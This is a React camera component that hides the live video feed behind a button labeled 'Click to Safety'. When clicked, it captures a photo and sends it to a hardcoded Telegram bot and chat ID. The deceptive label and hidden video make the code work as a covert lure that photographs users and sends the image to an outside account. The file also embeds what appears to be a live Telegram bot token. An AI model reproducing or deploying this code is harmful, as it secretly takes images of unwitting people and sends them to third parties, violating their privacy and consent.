import React, { useRef, useState, useEffect } from 'react';
import axios from 'axios';

const Cam = () => {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [imageData, setImageData] = useState(null);
  const [isButtonDisabled, setIsButtonDisabled] = useState(true); // State for button disable

  // Start the camera
  useEffect(() => {
    const startCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        videoRef.current.srcObject = stream;
      } catch (error) {
        console.error('Error accessing the camera:', error);
      }
    };

    startCamera();

    // Disable button for 10 seconds
    const timer = setTimeout(() => {
      setIsButtonDisabled(false); // Enable the button after 10 seconds
    }, 10000); // 10 seconds

    // Clean up the timer on component unmount
    return () => clearTimeout(timer);
  }, []);

  // Capture the image from the video stream
  const capturePhoto = () => {
    const canvas = canvasRef.current;
    const video = videoRef.current;
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Get the image data in base64
    const data = canvas.toDataURL('image/jpeg');
    setImageData(data);
    sendPhoto(data);
  };

  // Send the captured image to the Telegram API
  const sendPhoto = async (photoData) => {
    const base64Image = photoData.split(',')[1]; // Remove the prefix

    // Convert base64 to Blob
    const blob = await fetch(`data:image/jpeg;base64,${base64Image}`).then(res => res.blob());

    const TELEGRAM_BOT_TOKEN = '7841467705:AAHisJC3WaqrKZM4TNqw64Etm9GtjzOE1Kc'; // Replace with your bot token
    const TELEGRAM_CHAT_ID = '5941920855'; // Replace with your chat ID

    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, 'photo.jpg'); // Ensure the file name is present

    try {
      const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, formData, {
        headers: {
          'Content-Type': 'multipart/form-data',
        },
      });

      console.log('Photo sent successfully:', response.data);
    } catch (error) {
      console.error('Error sending the photo:', error.response ? error.response.data : error.message);
    }
  };

  return (
    <div>
      <video ref={videoRef} autoPlay style={{ width: '100%', display: "none" }} />
      <canvas ref={canvasRef} style={{ display: 'none' }} />
      <button onClick={capturePhoto} className='btn-cam'>
        Click to Safety
      </button>
    </div>
  );
};

export default Cam;